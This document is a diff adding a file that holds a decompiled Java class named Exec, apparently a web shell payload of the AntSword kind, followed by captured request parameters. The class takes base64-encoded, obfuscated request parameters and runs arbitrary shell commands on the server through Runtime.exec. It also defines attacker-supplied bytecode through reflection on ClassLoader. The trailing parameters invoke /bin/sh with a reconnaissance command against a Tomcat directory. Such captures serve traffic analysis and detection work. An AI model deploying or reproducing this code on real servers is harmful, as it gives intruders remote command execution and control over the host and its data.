@@ -1,0 +1,209 @@
+pass=/*
+ * Decompiled with CFR.
+ * 
+ * Could not load the following classes:
+ *  javax.servlet.http.HttpServletRequest
+ *  javax.servlet.http.HttpServletResponse
+ */
+package command;
+
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.lang.Class;
+import java.lang.ClassLoader;
+import java.lang.Exception;
+import java.lang.Integer;
+import java.lang.Object;
+import java.lang.Process;
+import java.lang.Runtime;
+import java.lang.String;
+import java.lang.StringBuffer;
+import java.lang.System;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+public class Exec {
+    public HttpServletRequest request = null;
+    public HttpServletResponse response = null;
+    public String encoder = "base64";
+    public String cs = "UTF8";
+    public String randomPrefix = "2";
+    public String decoderClassdata;
+
+    public boolean equals(Object object) {
+        this.parseObj(object);
+        StringBuffer stringBuffer = new StringBuffer();
+        String string = "10809cd";
+        String string2 = "0d318c7628";
+        String string3 = "sfc5c1bf1f8468";
+        String string4 = "m27a3f7ed8b223";
+        String string5 = "sbb83dbc06cd47";
+        String string6 = "t1deedcfd2b76b";
+        try {
+            this.response.setContentType("text/html");
+            this.request.setCharacterEncoding(this.cs);
+            this.response.setCharacterEncoding(this.cs);
+            String string7 = this.decode(this.request.getParameter(string3));
+            String string8 = this.decode(this.request.getParameter(string4));
+            String string9 = this.decode(this.request.getParameter(string5));
+            this.decoderClassdata = this.decode(this.request.getParameter(string6));
+            stringBuffer.append(this.ExecuteCommandCode(string7, string8, string9));
+        }
+        catch (Exception exception) {
+            stringBuffer.append("ERROR:// " + exception.toString());
+        }
+        try {
+            this.response.getWriter().print(string + this.asoutput(stringBuffer.toString()) + string2);
+        }
+        catch (Exception exception) {
+            // empty catch block
+        }
+        return true;
+    }
+
+    String decode(String string) throws Exception {
+        int n = 0;
+        try {
+            n = Integer.parseInt(this.randomPrefix);
+            string = string.substring(n);
+        }
+        catch (Exception exception) {
+            n = 0;
+        }
+        if (this.encoder.equals("hex")) {
+            if (string == null || string.equals("")) {
+                return "";
+            }
+            String string2 = "0123456789ABCDEF";
+            string = string.toUpperCase();
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(string.length() / 2);
+            String string3 = "";
+            for (int i = 0; i < string.length(); i += 2) {
+                string3 = string3 + (string2.indexOf(string.charAt(i)) << 4 | string2.indexOf(string.charAt(i + 1))) + ",";
+                byteArrayOutputStream.write(string2.indexOf(string.charAt(i)) << 4 | string2.indexOf(string.charAt(i + 1)));
+            }
+            return byteArrayOutputStream.toString(this.cs);
+        }
+        if (this.encoder.equals("base64")) {
+            return new String(this.Base64DecodeToByte(string), this.cs);
+        }
+        return string;
+    }
+
+    public String ExecuteCommandCode(String string, String string2, String string3) throws Exception {
+        StringBuffer stringBuffer = new StringBuffer();
+        String[] stringArray = new String[]{string, !this.isWin() ? "-c" : "/c", string2};
+        Map<String, String> map = System.getenv();
+        HashMap<String, String> hashMap = new HashMap<String, String>(map);
+        String[] stringArray2 = string3.split("\\|\\|\\|asline\\|\\|\\|");
+        for (int i = 0; i < stringArray2.length; ++i) {
+            String[] stringArray3 = stringArray2[i].split("\\|\\|\\|askey\\|\\|\\|");
+            if (stringArray3.length != 2) continue;
+            hashMap.put(stringArray3[0], stringArray3[1]);
+        }
+        String[] stringArray4 = new String[hashMap.size()];
+        int n = 0;
+        for (String string4 : hashMap.keySet()) {
+            stringArray4[n] = string4 + "=" + (String)hashMap.get(string4);
+            ++n;
+        }
+        Process process = Runtime.getRuntime().exec(stringArray, stringArray4);
+        this.CopyInputStream(process.getInputStream(), stringBuffer);
+        this.CopyInputStream(process.getErrorStream(), stringBuffer);
+        return stringBuffer.toString();
+    }
+
+    boolean isWin() {
+        String string = System.getProperty("os.name");
+        string = string.toLowerCase();
+        return string.startsWith("win");
+    }
+
+    void CopyInputStream(InputStream inputStream, StringBuffer stringBuffer) throws Exception {
+        String string;
+        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, this.cs));
+        while ((string = bufferedReader.readLine()) != null) {
+            stringBuffer.append(string + "\r\n");
+        }
+        bufferedReader.close();
+    }
+
+    public void parseObj(Object object) {
+        block8: {
+            if (object.getClass().isArray()) {
+                Object[] objectArray = (Object[])object;
+                this.request = (HttpServletRequest)objectArray[0];
+                this.response = (HttpServletResponse)objectArray[1];
+            } else {
+                try {
+                    Class<?> clazz = Class.forName("javax.servlet.jsp.PageContext");
+                    this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest", new Class[0]).invoke(object, new Object[0]);
+                    this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse", new Class[0]).invoke(object, new Object[0]);
+                }
+                catch (Exception exception) {
+                    if (!(object instanceof HttpServletRequest)) break block8;
+                    this.request = (HttpServletRequest)object;
+                    try {
+                        Field field = this.request.getClass().getDeclaredField("request");
+                        field.setAccessible(true);
+                        HttpServletRequest httpServletRequest = (HttpServletRequest)field.get(this.request);
+                        Field field2 = httpServletRequest.getClass().getDeclaredField("response");
+                        field2.setAccessible(true);
+                        this.response = (HttpServletResponse)field2.get(httpServletRequest);
+                    }
+                    catch (Exception exception2) {
+                        try {
+                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(object, new Object[0]);
+                        }
+                        catch (Exception exception3) {
+                            // empty catch block
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    public String asoutput(String string) {
+        try {
+            byte[] byArray = this.Base64DecodeToByte(this.decoderClassdata);
+            Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+            method.setAccessible(true);
+            Class clazz = (Class)method.invoke(this.getClass().getClassLoader(), byArray, 0, byArray.length);
+            return clazz.getConstructor(String.class).newInstance(string).toString();
+        }
+        catch (Exception exception) {
+            return string;
+        }
+    }
+
+    public byte[] Base64DecodeToByte(String string) {
+        byte[] byArray = null;
+        String string2 = System.getProperty("java.version");
+        try {
+            if (string2.compareTo("1.9") >= 0) {
+                Class<?> clazz = Class.forName("java.util.Base64");
+                Object object = clazz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
+                byArray = (byte[])object.getClass().getMethod("decode", String.class).invoke(object, string);
+            } else {
+                Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
+                byArray = (byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), string);
+            }
+            return byArray;
+        }
+        catch (Exception exception) {
+            return new byte[0];
+        }
+    }
+}
+
+t1deedcfd2b76b=
+sbb83dbc06cd47=
+m27a3f7ed8b223=cd "/usr/local/tomcat";ls;echo 642fd9a8;pwd;echo 51ebc8
+sfc5c1bf1f8468=/bin/sh
